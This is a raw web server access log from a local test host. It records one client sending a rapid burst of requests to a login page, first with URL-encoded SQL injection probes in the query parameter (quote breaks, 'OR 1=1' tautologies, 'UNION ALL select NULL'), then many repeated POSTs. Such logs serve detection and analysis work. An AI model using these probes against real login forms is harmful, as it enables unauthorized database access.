172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=%29 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query%29 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query+AND+1%3D1+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query+AND+1%3D2+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query+OR+1%3D1+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query+AND+1%3D2+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query+OR+1%3D1+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 300 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
